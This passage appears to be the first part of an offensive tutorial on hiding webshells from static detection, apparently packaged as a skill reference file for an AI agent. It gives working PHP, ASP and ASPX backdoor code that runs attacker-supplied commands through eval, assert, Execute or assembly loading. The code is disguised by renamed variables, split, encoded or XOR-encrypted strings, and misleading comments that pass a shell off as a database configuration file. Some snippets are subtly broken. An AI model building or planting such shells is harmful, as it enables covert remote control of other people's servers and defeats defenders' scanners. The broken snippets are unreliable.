### 1.1 Variable Name Obfuscation

Replace characteristic variable names (`$_POST`, `eval`, `assert`, `cmd`, `exec`) with randomly generated or semantically neutral names.

**PHP Example — Basic variable obfuscation:**

```php
<?php
// Original (detected signature)
$_POST['cmd'] = $_GET['pass'];
@eval($_POST['cmd']);

// Variable obfuscated
$l3m0n = '_PO' . 'ST';
$c0c0 = ${$l3m0n}['x7'];
$d0g3 = 'a' . 's' . 's' . 'e' . 'r' . 't';
$d0g3($c0c0);
?>
```

**PHP Example — Advanced dynamic variable assembly:**

```php
<?php
$k1 = chr(95).chr(80).chr(79).chr(83).chr(84);  // _POST
$k2 = chr(101).chr(118).chr(97).chr(108);        // eval
$v = $_REQUEST['_'];
if (strlen($v) > 0) {
    $GLOBALS[$k1] = $v;
    $k2($GLOBALS[$k1]);
}
?>
```

**PHP Example — Random variable name generation (one-time):**

```php
<?php
$r1 = substr(md5(rand()), 0, 8);
$r2 = substr(md5(rand()), 0, 8);
$r3 = substr(sha1(rand()), 0, 6);
$$r1 = $_REQUEST[$r3] ?? '';
if ($$r1) {
    call_user_func(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116), $$r1);
}
?>
```

### 1.2 String Encryption and Splitting

Break characteristic strings like `eval`, `assert`, `system`, `exec`, `shell_exec`, `passthru` into non-contiguous fragments.

**PHP Example — String splitting techniques:**

```php
<?php
// Method 1: Concatenation
$f = 'as'.'sert';

// Method 2: chr() encoding
$f = chr(97).chr(115).chr(115).chr(101).chr(114).chr(116); // assert

// Method 3: base64 decode
$f = base64_decode('YXNzZXJ0');

// Method 4: strrev reverse
$f = strrev('tressa');

// Method 5: substr from a larger string
$f = substr('abcdefghijklmnopqrstuvwxyz', 0, 1) . substr('s', 0, 1) . substr('sample', 1, 1) . substr('hello', 1, 1) . substr('red', 1, 1) . substr('tree', 4, 1);

// Method 6: XOR encoding
$f = 'string1' ^ 'string2'; // yields target function name

// Method 7: bitwise NOT (~)
$f = ~"\x9e\x8d\x8d\x9a\x8d\x9e"; // yields certain strings

// Usage
$f(base64_decode($_POST['cmd']));
?>
```

**PHP Example — Multi-layer XOR encryption:**

```php
<?php
function xor_decrypt($data, $key) {
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $out;
}

$enc_payload = "\x12\x34\x56\x78..."; // pre-encrypted payload
$key = substr(md5($_SERVER['HTTP_HOST']), 0, 8);
$code = xor_decrypt($enc_payload, $key);
eval($code);
?>
```

**ASP Example:**

```
<%
Function d(s)
    d = ""
    For i = 1 To Len(s) Step 2
        d = d & Chr(CLng("&H" & Mid(s, i, 2)))
    Next
End Function

Dim cmd : cmd = Request("c")
If cmd <> "" Then
    Execute(d("4578656375746528636d6429")) ' Executes: Execute(cmd)
End If
%>
```

**ASPX Example:**

```csharp
<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string k = System.Text.Encoding.UTF8.GetString(
        System.Convert.FromBase64String(/* encoded key */));
    string c = Request.Params[k];
    if (!string.IsNullOrEmpty(c)) {
        System.Reflection.Assembly.Load(
            System.Convert.FromBase64String(c))
            .GetType("R.Run").GetMethod("Go").Invoke(null, null);
    }
}
</script>
```

### 1.3 Comment Obfuscation

Inject random comments (both valid and misleading) to break signature matching patterns.

**PHP Example:**

```php
<?php
// This is a database configuration file
// MySQL connection settings
// Copyright 2024 - All rights reserved

/**
 * Database Handler Class
 * @author Development Team
 * @version 2.1.3
 */

// config
$/*db*/_/*host*/P/*port*/O/*user*/S/*pass*/T/*name*/ = 'x';
$a = 'c'; // cache key
$b = 'm'; // buffer size
$c = 'd'; // connection timeout
$d = $a . $b . $c; // cmd
// logging functionality
$e = $/*debug*/_/*info*/P/*error*/O/*warn*/S/*trace*/T[$d];
// execute query
if ($e) {
    // Development mode: execute command
    $f = chr(101); // e
    $g = chr(118); // v
    $h = chr(97);  // a
    $i = chr(108); // l
    $f($g($h($i($e))));
    // End of database handler
}
// File end
?>
```



---
📖 本切片 1/2 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-01-webshell-static-evasion-02.md")`